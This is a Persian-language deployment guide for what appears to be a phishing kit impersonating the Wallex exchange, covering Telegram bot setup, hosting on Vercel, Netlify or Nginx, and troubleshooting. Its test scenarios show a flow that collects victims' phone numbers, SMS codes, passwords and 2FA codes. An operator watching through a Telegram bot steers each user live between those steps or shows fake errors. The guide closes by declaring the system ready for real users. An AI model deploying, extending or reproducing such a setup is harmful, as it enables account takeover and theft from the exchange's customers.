# 🚀 راهنمای استقرار سیستم والکس

## 📋 **پیش‌نیازها**

### 🔧 **محیط توسعه**
- Node.js 18+ 
- npm یا yarn
- Git
- دسترسی به اینترنت

### 🤖 **تنظیمات تلگرام**
1. **ایجاد ربات تلگرام**:
   - پیام دادن به @BotFather
   - دستور `/newbot`
   - انتخاب نام و نام کاربری
   - دریافت Bot Token

2. **دریافت Chat ID**:
   - پیام دادن به @userinfobot
   - یا استفاده از @getmyid_bot
   - کپی کردن عدد Chat ID

## ⚙️ **تنظیمات محیطی**

### 1️⃣ **کپی کردن متغیرهای محیطی**
```bash
cp .env.example .env
```

### 2️⃣ **پر کردن اطلاعات تلگرام**
```env
VITE_TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
VITE_TELEGRAM_CHAT_ID=123456789
```

### 3️⃣ **تنظیمات پشتیبانی (اختیاری)**
```env
VITE_WALLEX_CHAT_TYPE=telegram
VITE_WALLEX_TELEGRAM_SUPPORT=https://t.me/WallexSupport
```

## 🏗️ **فرآیند Build**

### 📦 **نصب وابستگی‌ها**
```bash
npm install
```

### 🔍 **بررسی نوع‌ها**
```bash
npm run typecheck
```

### 🎯 **Build تولید**
```bash
npm run build
```

### ✅ **تست local**
```bash
npm run preview
```

## 🌐 **روش‌های استقرار**

### 🟢 **Vercel (توصیه شده)**

#### **مراحل:**
1. **اتصال Repository**:
   ```bash
   git remote add origin <your-repo-url>
   git push -u origin main
   ```

2. **Import در Vercel**:
   - ورود به vercel.com
   - کلیک "Import Project"
   - انتخاب repository

3. **تنظیم Environment Variables**:
   ```
   VITE_TELEGRAM_BOT_TOKEN = your_bot_token
   VITE_TELEGRAM_CHAT_ID = your_chat_id
   ```

4. **Deploy**:
   - Vercel automatically builds and deploys

#### **مزایا:**
- ✅ HTTPS خودکار
- ✅ CDN global
- ✅ Deploy خودکار با git push
- ✅ Preview برای PRها

### 🔵 **Netlify**

#### **مراحل:**
1. **Build Command**: `npm run build`
2. **Publish Directory**: `dist`
3. **Environment Variables**: همانند Vercel

#### **تنظیمات اضافی:**
```toml
# netlify.toml
[build]
  command = "npm run build"
  publish = "dist"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
```

### ⚫ **Self-Hosted**

#### **با Nginx:**
```nginx
server {
    listen 80;
    server_name yourdomain.com;
    
    location / {
        root /var/www/wallex/dist;
        try_files $uri $uri/ /index.html;
    }
    
    # Security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header X-XSS-Protection "1; mode=block";
}
```

#### **با Docker:**
```dockerfile
FROM nginx:alpine
COPY dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

## 🔒 **Security Checklist**

### ✅ **SSL/HTTPS**
- اطمینان از HTTPS در production
- HTTP Strict Transport Security (HSTS)
- Secure cookies

### ✅ **Environment Variables**
- عدم commit کردن .env
- استفاده از secure storage برای secrets
- Rotation منظم tokenها

### ✅ **Content Security Policy**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline'; 
               style-src 'self' 'unsafe-inline';
               connect-src 'self' https://*.workers.dev;">
```

### ✅ **Telegram Security**
- محدود کردن دسترسی bot به chat مشخص
- Webhook security اگر استفاده می‌شود
- Rate limiting برای API calls

## 📊 **Monitoring & Analytics**

### 🔍 **Performance Monitoring**
- Google PageSpeed Insights
- Web Vitals tracking
- Core Web Vitals optimization

### 📈 **User Analytics** (اختیاری)
```javascript
// Google Analytics 4
gtag('config', 'GA_MEASUREMENT_ID');

// Custom events
gtag('event', 'login_attempt', {
  'auth_method': 'telegram'
});
```

### 🚨 **Error Tracking**
- Sentry integration
- Console error monitoring
- User feedback collection

## 🔧 **صحت‌سنجی استقرار**

### ✅ **Checklist نهایی**

#### **🎯 Core Functionality**
- [ ] Login flow کامل
- [ ] Telegram bot response
- [ ] Admin controls working
- [ ] Error handling active
- [ ] Mobile responsive

#### **⚡ Performance**
- [ ] Page load < 3 seconds
- [ ] Bundle size optimized
- [ ] Images compressed
- [ ] Caching configured

#### **🔒 Security**
- [ ] HTTPS enabled
- [ ] Environment variables secure
- [ ] No exposed secrets
- [ ] CSP headers active

#### **📱 Mobile**
- [ ] Touch-friendly interface
- [ ] Responsive design
- [ ] Keyboard handling
- [ ] Offline fallback

### 🧪 **Test Scenarios**

#### **1. Complete User Flow**
```
1. وارد کردن شماره موبایل
2. دریافت کد تایید
3. وارد کردن رمز عبور
4. فعال‌سازی 2FA
5. تایید ایمیل
```

#### **2. Admin Control Flow**
```
1. کاربر در حال پردازش
2. ادمین دکمه‌ها را می‌بیند
3. انتخاب عملیات (PASS/SMS/2FA/EMAIL)
4. تغییر مسیر کاربر
5. اعلام خطا در صورت نیاز
```

#### **3. Error Scenarios**
```
1. شبکه قطع
2. Token نامعتبر
3. Chat ID اشتباه
4. Rate limiting
5. Server timeout
```

## 🆘 **عیب‌یابی**

### ❌ **مشکلات متداول**

#### **Telegram Bot پاسخ نمی‌دهد**
```bash
# چک کردن token
curl "https://api.telegram.org/bot<TOKEN>/getMe"

# چک کردن webhook
curl "https://api.telegram.org/bot<TOKEN>/getWebhookInfo"
```

#### **Build خطا می‌دهد**
```bash
# پاک کردن cache
rm -rf node_modules package-lock.json
npm install

# بررسی TypeScript
npm run typecheck
```

#### **Environment Variables کار ��می‌کنند**
- بررسی پیشوند `VITE_`
- Restart development server
- چک کردن `.env` در root directory

### 🔧 **Debug Mode**
```bash
# فعال‌سازی debug logs
VITE_DEBUG_MODE=true npm run dev
```

## 📞 **پشتیبانی**

### 🆘 **در صورت مشکل**
1. بررسی console errors
2. چک کردن network tab
3. تست token تلگرام
4. بررسی environment variables
5. مطالعه documentation

### 📚 **منابع مفید**
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [Vite Documentation](https://vitejs.dev/)
- [React Documentation](https://react.dev/)
- [Vercel Deployment](https://vercel.com/docs)

---

## 🎉 **تبریک!**

سیستم شما آماده عملیاتی است! 🚀

با دنبال کردن این راهنما، سیستم والکس شما با موفقیت deploy شده و آماده استفاده توسط کاربران واقعی است.
